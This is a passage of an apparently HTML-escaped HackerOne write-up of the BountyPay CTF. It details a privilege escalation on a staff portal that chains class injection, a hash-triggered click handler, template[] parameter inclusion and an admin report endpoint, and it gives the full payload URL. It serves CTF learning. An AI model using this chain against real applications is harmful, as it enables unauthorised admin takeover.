href=\"/redirect?url=http%3A%2F%2Fstaff.bountypay.h1ctf.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003estaff.bountypay.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e application, there\u0026#39;s a few things to note here:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eWe get some clientside \u003ccode\u003ejs\u003c/code\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e/js/website.js\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eThe account is \u003cstrong\u003enot\u003c/strong\u003e admin and we probably need admin rights to see more\n\n\u003cul\u003e\n\u003cli\u003e\n\u003ccode\u003e/template=admin\u003c/code\u003e gives 403\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eWe control the \u003ccode\u003eprofile_avatar\u003c/code\u003e input name since we can change it clientside however sensitive chars are filtered, we also control our user name but this wasn\u0026#39;t of much use here\n\n\u003cul\u003e\n\u003cli\u003einjection is possible though \u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eWhen looking at the \u003ccode\u003ewebsite.js\u003c/code\u003e file I noticed \u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eThe \u003ccode\u003eupgradeToAdmin\u003c/code\u003e function, I tried to hit the route myself but only admins can do it (it\u0026#39;s a \u003ccode\u003eGET\u003c/code\u003e request to /admin/upgrade?username=sandra.allison)\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003esendReport\u003c/code\u003e function that submits a \u003ccode\u003eurl\u003c/code\u003e which is generated by the app and it\u0026#39;s \u003ccode\u003ebase64 encoded\u003c/code\u003e the url is generated for each page - the modal mentions an admin will take a look at the page, this is great if we can trick the admin into making that upgrade request for us, we could become admins too. \u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// javascript from the application\u003c/span\u003e\n\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.upgradeToAdmin\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eclick\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einput[name=\u0026quot;username\u0026quot;]\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/admin/upgrade?username=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eUser Upgraded to Admin\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}),\u003c/span\u003e\n\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.tab\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eclick\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.tab\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eremoveClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eactive\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eactive\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ediv.content\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ediv.content-\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eattr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003edata-target\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)).\u003c/span\u003e\u003cspan class=\"nx\"\u003eremoveClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}),\u003c/span\u003e\n\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.sendReport\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eclick\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/admin/report?url=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eReport sent to admin team\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}),\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e#myModal\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003emodal\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehide\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}),\u003c/span\u003e\n\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \n\u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e#tab1\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \n\u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.tab1\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e#tab2\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.tab2\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e#tab3\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.tab3\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e#tab4\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.tab4\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"document-hash\"\u003edocument.hash\u003c/h3\u003e\n\n\u003cp\u003eI spent a lot of time trying to get \u003ccode\u003exss\u003c/code\u003e since there was an html injection in the \u003ccode\u003eavatar_name\u003c/code\u003e input value when choosing an avatar under the \u003ccode\u003eProfile\u003c/code\u003e tab. I realized I controlled a field that gets echoed back as a class and if I could just trigger the \u003ccode\u003e.upgradeToAdmin\u003c/code\u003e function, I might be able to store that in the \u003ccode\u003eprofile_avatar\u003c/code\u003e variable that I control, the last part was getting the admin to make the request. \u003c/p\u003e\n\n\u003cp\u003eHow do we trigger the function though? \u003cbr\u003e\nWell since we control a class and there\u0026#39;s a class that get\u0026#39;s used in the \u003ccode\u003ejquery\u003c/code\u003e above to check the tabs and then fire their \u003ccode\u003eclick\u003c/code\u003e events could we take advantage of that event and use it for our purposes? Yes we can! \u003cbr\u003e\n{F853204}\u003cbr\u003e\nBy setting a avatar with the \u003ccode\u003eavatar_name\u003c/code\u003e input value  to \u003ccode\u003etab1 upgradeToAdmin\u003c/code\u003e and then accessing the hash we set in our \u003ccode\u003eavatar_name\u003c/code\u003e directly \u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2F%23tab1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://staff.bountypay.h1ctf.com/#tab1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e this makes the \u003ccode\u003eclick\u003c/code\u003e event propagate, and it even makes the request for us since it fires off the \u003ccode\u003eclick\u003c/code\u003e event for \u003ccode\u003eupgradeToAdmin\u003c/code\u003e however - we are missing something:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e// upgradeToAdmin function \nlet t = $(\u0026#39;input[name=\u0026quot;username\u0026quot;]\u0026#39;).val();\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe function needs to grab the username from an input field, I knew I was on the right track because I could see the request to \u003ccode\u003e/admin/upgrade?username=undefined\u003c/code\u003e. The \u003ccode\u003eundefined\u003c/code\u003e happened because the function that triggered the request grabs the \u003ccode\u003eusername\u003c/code\u003e from an input field named \u003ccode\u003eusername\u003c/code\u003e which is no where in the application - or is it? \u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003ethe event propagation surprised me and at first I didn\u0026#39;t understand it but after debugging the jquery it hit me that since the location hash was being used to fire off a \u003ccode\u003eclick\u003c/code\u003e event the event propagation would make any class that was in the same element fire off any click events that were associated with that class and luckily for us the request we need to make is handled by a click event bound to a class - with our injection we can inject the class that starts the click event and then the class name that fires our get request\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch3 id=\"input-name-username-val\"\u003einput[name=\u0026#39;username\u0026#39;].val()\u003c/h3\u003e\n\n\u003cp\u003eThis is the last part before we can send our admin a malicious link that will upgrade us, but how can we get that \u003ccode\u003eusername\u003c/code\u003e parameter? \u003cbr\u003e\nThe only input with the \u003ccode\u003eusername\u003c/code\u003e value is the login page - I knew we had to include that page since there\u0026#39;s no other way, and we know we are using templates because the route we are on is \u003ccode\u003e/?template=home\u003c/code\u003e since we need to pull multiple templates I thought about array params - which even \u003ccode\u003ehackerone\u003c/code\u003e uses and made the following request \u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2F%3Ftemplate%255B%255D%3Dhome%26template%255B%255D%3Dlogin\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://staff.bountypay.h1ctf.com/?template[]=home\u0026amp;template[]=login\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2020-06-01_at_11.18.46_AM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/G3eYoRYmN25hEwK6wkBgphoW?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_11.18.46_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_11.18.46_AM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070629Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=2e5b493ff51fe95e2666a4cfb6e7fe4c096df20376668b3e9ebcb0c1ac57dc3d\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/G3eYoRYmN25hEwK6wkBgphoW?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_11.18.46_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_11.18.46_AM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070629Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=2e5b493ff51fe95e2666a4cfb6e7fe4c096df20376668b3e9ebcb0c1ac57dc3d\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\nBuilding up from this we can change our payload slightly to fill in the \u003ccode\u003eusername\u003c/code\u003e and make sure we direct the admin to a page where our username will be seen since the only part of the application that is not in the \u003ccode\u003e/template=home\u003c/code\u003e is the ticket where our username is available to the admin and we need to make sure the class we set is seen by the admin to trigger the attack so let\u0026#39;s just send the admin there with our full payload:\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2F%3Ftemplate%255B%255D%3Dlogin%26username%3Dsandra.allison%26template%255B%255D%3Dticket%26ticket_id%3D3582%23tab2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://staff.bountypay.h1ctf.com/?template[]=login\u0026amp;username=sandra.allison\u0026amp;template[]=ticket\u0026amp;ticket_id=3582#tab2\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis will take the admin to the ticket template but will also pull in the login template and use the input field with our username - now when the admin receives this payload it will trigger the attack, to do this we can send a report to \u003ccode\u003e/admin/report?url=base64\u003c/code\u003e the \u003ccode\u003ebase64\u003c/code\u003e will be our payload since that includes our malicious link - now this will trigger the admin to make the upgrade request and we will become application admininstrator:\u003c/p\u003e\n\n\u003cp\u003eNow all we need is to set the \u003ccode\u003eavatar_name\u003c/code\u003e value to \u003ccode\u003etab2 